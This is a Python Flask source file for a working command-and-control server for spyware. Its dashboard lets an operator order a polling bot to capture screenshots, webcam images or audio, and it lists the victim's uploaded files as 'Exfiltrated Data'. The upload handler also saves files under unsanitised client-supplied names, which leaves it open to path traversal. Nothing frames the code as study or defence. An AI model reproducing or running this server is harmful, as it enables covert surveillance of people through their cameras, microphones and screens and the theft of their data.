from flask import Flask, request, jsonify, render_template_string
import os

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Global command variable to control the bot
# Commands: "none", "screenshot", "webcam", "audio"
current_command = "none"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard</title>
    <style>
        body { font-family: monospace; background: #0f0f0f; color: #00ff00; padding: 20px; }
        h1 { border-bottom: 2px solid #00ff00; padding-bottom: 10px; }
        .card { border: 1px solid #333; margin: 10px 0; padding: 10px; background: #1a1a1a; }
        a { color: #00ff00; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .cmd-btn { background: #333; color: #fff; border: 1px solid #fff; padding: 5px 10px; cursor: pointer; }
        .cmd-btn:hover { background: #555; }
    </style>
</head>
<body>
    <h1>[ COMMAND & CONTROL DASHBOARD ]</h1>
    
    <div class="card">
        <h3>Issue Command</h3>
        <p>Current Command: <strong>{{ current_command }}</strong></p>
        <form method="POST" action="/set_command">
            <button class="cmd-btn" name="cmd" value="none">Clear</button>
            <button class="cmd-btn" name="cmd" value="screenshot">Capture Screenshot</button>
            <button class="cmd-btn" name="cmd" value="webcam">Capture Webcam</button>
            <button class="cmd-btn" name="cmd" value="audio">Record Audio</button>
        </form>
    </div>

    <div class="card">
        <h3>Exfiltrated Data ({{ files|length }} files)</h3>
        <ul>
            {% for file in files %}
            <li><a href="#">{{ file }}</a></li>
            {% endfor %}
        </ul>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    files = sorted(os.listdir(UPLOAD_FOLDER), reverse=True)
    return render_template_string(HTML_TEMPLATE, files=files, current_command=current_command)

@app.route('/set_command', methods=['POST'])
def set_command():
    global current_command
    current_command = request.form.get('cmd', 'none')
    return index()

@app.route('/command', methods=['GET'])
def get_command():
    # Bot polls this endpoint to see if there is work to do
    global current_command
    cmd = current_command
    # Reset command after one fetch so we don't spam screenshots
    if cmd != "none":
        current_command = "none" 
    return jsonify({"command": cmd})

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'document' not in request.files:
        return "No file part", 400
    file = request.files['document']
    if file.filename == '':
        return "No selected file", 400
    if file:
        filepath = os.path.join(UPLOAD_FOLDER, file.filename)
        file.save(filepath)
        print(f"[+] Received file: {file.filename}")
        return "File uploaded successfully", 200

if __name__ == '__main__':
    print("[*] C2 Server active on 0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000)
